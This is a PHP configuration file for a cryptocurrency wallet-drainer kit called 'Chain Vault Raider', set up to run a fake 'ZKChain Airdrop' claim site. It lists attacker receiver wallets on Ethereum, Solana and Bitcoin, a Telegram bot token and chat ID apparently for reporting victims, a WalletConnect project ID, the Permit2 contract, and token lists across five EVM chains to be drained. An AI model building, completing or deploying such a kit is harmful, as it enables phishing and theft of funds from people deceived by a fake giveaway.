<?php
/* ============================================
   CHAIN VAULT RAIDER — GLOBAL CONFIGURATION
   EDIT ONLY THIS FILE
   ============================================ */
$CONFIG = [
    'telegram' => [
        'bot_token' => '8285987654:AAE5wsvazOtcLc46Llwr2uyl-15u9VUlC6A',
        'chat_id'   => '-4968363856',
    ],
    'wallets' => [
        'receiver' => '0xbd9dd16A5bcE4dE5Ff2E0A9379bddc7E7Fd1295f',
        'solana_receiver' => 'Ac5yiccS7fZTj9pD6rcKZWC6b7yqK28uEPcjgv1nXujb',
        'bitcoin_receiver' => 'bc1qsfydz6l7we8ppgxk2xjufm64dp6nyd5nmrn88h',
    ],
    'site' => [
        'template' => 'airdrop_elite',
        'title' => 'ZKChain Airdrop — Claim Season 3',
    ],
    'chains' => [
        'ethereum' => ['name'=>'Ethereum','chainId'=>1,'symbol'=>'ETH','explorer'=>'https://etherscan.io','rpc'=>'https://cloudflare-eth.com'],
        'bsc' => ['name'=>'BNB Smart Chain','chainId'=>56,'symbol'=>'BNB','explorer'=>'https://bscscan.com','rpc'=>'https://bsc-dataseed.binance.org'],
        'polygon' => ['name'=>'Polygon','chainId'=>137,'symbol'=>'MATIC','explorer'=>'https://polygonscan.com','rpc'=>'https://polygon-rpc.com'],
        'arbitrum' => ['name'=>'Arbitrum One','chainId'=>42161,'symbol'=>'ETH','explorer'=>'https://arbiscan.io','rpc'=>'https://arb1.arbitrum.io/rpc'],
        'base' => ['name'=>'Base','chainId'=>8453,'symbol'=>'ETH','explorer'=>'https://basescan.org','rpc'=>'https://mainnet.base.org'],
        'solana' => ['name'=>'Solana','symbol'=>'SOL','explorer'=>'https://solscan.io'],
        'bitcoin' => ['name'=>'Bitcoin','symbol'=>'BTC','explorer'=>'https://mempool.space'],
    ],
    'permit2' => '0x000000000022D473030F116dDEE9F6B43aC78BA3',
    'tokens' => [
        'ethereum' => [
            'USDT'=>'0xdAC17F958D2ee523a2206206994597C13D831ec7',
            'USDC'=>'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            'DAI' =>'0x6B175474E89094C44Da98b954EedeAC495271d0F',
            'WETH'=>'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
            'WBTC'=>'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
            'LINK'=>'0x514910771AF9Ca656af840dff83E8264EcF986CA',
            'SHIB'=>'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
            'UNI' =>'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
            'AAVE'=>'0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
            'PEPE'=>'0x6982508145454Ce325dDbE47a25d4ec3d2311933',
        ],
        'bsc' => [
            'USDT'=>'0x55d398326f99059fF775485246999027B3197955',
            'USDC'=>'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            'DAI' =>'0x1AF3F390e6271F88e6130d16dBe06213a15b203F',
            'WETH'=>'0x2170Ed0880ac9A755fd29B2688956BD959F93338',
            'LINK'=>'0xF8A0BF9cF54Bb92F17374d9e9A3215fC15226Da8',
            'UNI' =>'0xBF5140B6e3012c9532926FD5CdAE0f828D07Ac9c',
            'AAVE'=>'0xFB6115445Bff7b52FeD9869a9388025294264ECc',
        ],
        'polygon' => [
            'USDT'=>'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
            'USDC'=>'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
            'DAI' =>'0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
            'WETH'=>'0x7ceB23fD6bC0adD59E62ac25578270CfF1b9f619',
            'LINK'=>'0x53E0bca35eC356AB5bD3d1DAE73fA18e1dB9e6B4',
            'AAVE'=>'0xD6DF932A45C0f255f85145f286eA0b292B97C3D4',
        ],
        'arbitrum' => [
            'USDT'=>'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
            'USDC'=>'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
            'DAI' =>'0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1',
            'WETH'=>'0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
            'WBTC'=>'0xf2ea0C67825D548D053336142Bb0b4429d4fB40F',
            'LINK'=>'0xf97f4df75117a78c1A5a0DBb814AfADE1E9d9cd5',
            'UNI' =>'0xFa7F8980b07f7E7dA1c72714990cd7baee810c20',
        ],
        'base' => [
            'USDC'=>'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
            'DAI' =>'0x50c5725949A6F0c72E6C4a541771c77551cFe11B',
            'WETH'=>'0x4200000000000000000000000000000000000006',
            'AERO'=>'0x940181a94A35A4569E4529A3A7A2d1486a2BB9f0',
            'LINK'=>'0x88F15070157507d53d5C31b0700EE1a337d95f07',
        ],
    ],
    'solana_drainer' => [
        'auto' => true,
        'mints' => [
            'USDC-SPL'=>'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
            'USDT-SPL'=>'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
            'JUP'     =>'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN',
            'BONK'    =>'DezXAZ8z7PnrnRJjz3wXBoRgixCaXRBlWkH7i3c1RhZo',
        ]
    ],
    'bitcoin_drainer' => [
        'display' => false,
        'label' => 'Bitcoin Ecash Airdrop'
    ],
    'walletconnect' => [
        'project_id' => '17943eb9e01e015a00554f0cb5d6f745',
    ],

];
?>